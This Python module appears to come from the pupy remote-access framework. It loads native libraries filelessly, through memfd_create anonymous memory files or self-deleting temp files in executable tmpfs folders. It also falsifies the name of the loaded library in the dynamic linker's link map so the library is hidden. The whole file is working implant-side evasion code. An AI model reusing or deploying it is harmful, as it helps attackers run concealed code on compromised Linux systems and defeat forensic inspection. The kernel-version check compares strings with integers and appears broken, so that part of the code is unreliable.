# -*- encoding: utf-8 -*-

__all__ = ('load_content',)


import os
import sys
import platform
import ctypes

import pupy

from .utils import load_library_common, find_writable_folder
from .posix import _does_dest_allows_executable_mappings

TMP_FOLDERS = ['/dev/shm', '/tmp', '/var/tmp']
RTLD_DI_LINKMAP = 2

SELF = ctypes.CDLL(None)

try:
    dlinfo = SELF.dlinfo
    dlinfo.argtypes = (
        ctypes.c_void_p, ctypes.c_int, ctypes.c_void_p
    )

except AttributeError:
    dlinfo = None

strdup = SELF.strdup
strdup.argtype = [ctypes.c_char_p]
strdup.restype = ctypes.c_char_p

free = SELF.free
free.argtype = [ctypes.c_char_p]

syscall = SELF.syscall

try:
    for mount in open('/proc/self/mounts'):
        _, dest, fstype, opts, _, _ = mount.split()
        opts = tuple(opts.split(','))
        if 'noexec' in opts or 'ro' in opts:
            continue

        if 'tmpfs' in fstype and dest not in TMP_FOLDERS:
            TMP_FOLDERS.insert(0, dest)

except OSError:
    pass


class LibName(ctypes.Structure):
    _fields_ = (
        ('l_name', ctypes.c_char_p),
        ('next', ctypes.c_void_p),
        ('dont_free', ctypes.c_int)
    )


class DlMapPrivate(ctypes.Structure):
    _fields_ = (
        ('l_addr', ctypes.c_void_p),
        ('l_name', ctypes.c_char_p),
        ('l_ld', ctypes.c_void_p),
        ('l_next', ctypes.c_void_p),
        ('l_prev', ctypes.c_void_p),
        ('l_real', ctypes.c_void_p),
        ('l_ns', ctypes.c_long),
        ('l_libname', ctypes.POINTER(LibName)),
    )


def _change_dlname(lib, new_name):
    lm = ctypes.POINTER(DlMapPrivate)()
    if dlinfo(lib._handle, RTLD_DI_LINKMAP, ctypes.byref(lm)) != 0:
        raise ValueError('dlinfo({}) failed'.format(lib._handle))

    load_path = lib._name
    lib_name = os.path.basename(load_path)

    if lm.contents.l_ns != 0:
        raise ValueError('dlinfo: unexpected LMID: {}'.format(lm.contents.l_ns))

    if lm.contents.l_libname.contents.l_name != lib_name and \
            lm.contents.l_libname.contents.l_name != load_path:
        raise ValueError('dlinfo: unexpected library name: {} != {} (or {})'.format(
            lm.contents.l_libname.contents.l_name, lib_name, load_path))

    lm.contents.l_name = strdup(new_name)
    lm.contents.l_libname.contents.l_name = strdup(new_name)


def _get_nr_memfd_create_syscall():
    __NR_memfd_create_syscall = {
        'x86_64': 319,
        'i686': 356,
        'arm': 385,
    }

    machine = platform.machine()
    if machine.startswith('arm'):
        machine = 'arm'

    return __NR_memfd_create_syscall.get(machine, None)


NR_memfd_create = _get_nr_memfd_create_syscall()


def _memfd_create(name):
    return syscall(NR_memfd_create, name, 0x1)


def memfd_is_supported():
    if not sys.platform.startswith('linux'):
        pupy.dprint('memfd: disabled for non-linux')
        return False

    if platform.system() == 'Java':
        pupy.dprint('memfd: disabled for jython')
        return False

    maj, min = platform.release().split('.')[:2]
    if maj < 3:
        pupy.dprint('memfd: kernel too old (maj < 3)')
        return False
    elif maj == 3 and min < 13:
        pupy.dprint('memfd: kernel too old (maj == 3, min < 13)')
        return False

    if syscall is None or dlinfo is None:
        pupy.dprint(
            'memfd: syscall={} dlinfo={}',
            syscall, dlinfo)
        return False

    if NR_memfd_create is None:
        pupy.dprint('memfd: Syscall NR is not defined')
        return False

    fd = _memfd_create('probe')
    if fd == -1:
        pupy.dprint('memfd: probe failed')
        return False

    try:
        supported = os.path.isfile(
            os.path.sep + os.path.join(
            'proc', 'self', 'fd', str(fd)))
        pupy.dprint('memfd: supported={} (fd={})', supported, fd)

        return supported
    finally:
        os.close(fd)


def memfd_create(name='heap'):
    fd = _memfd_create(name)
    if fd == -1:
        raise OSError('memfd_create failed')

    return os.fdopen(fd, 'wb'), os.path.sep + os.path.join(
        'proc', str(os.getpid()), 'fd', str(fd)
    )

if memfd_is_supported():
    def load_content(content, name, dlopen=False, initfuncname=None):
        fd, filepath = memfd_create()
        try:
            return load_library_common(
                fd, filepath, content, name, dlopen, initfuncname,
                _change_dlname
            )
        finally:
            fd.close()

else:
    import tempfile

    DROP_DIR = find_writable_folder(
        TMP_FOLDERS, validate=_does_dest_allows_executable_mappings
    )

    def load_content(content, name, dlopen=False, initfuncname=None):
        fd, filepath = tempfile.mkstemp(dir=DROP_DIR)
        fobj = os.fdopen(fd, 'wb')
        try:
            return load_library_common(
                fobj, filepath, content, name, dlopen, initfuncname
            )
        finally:
            os.unlink(filepath)
            fobj.close()
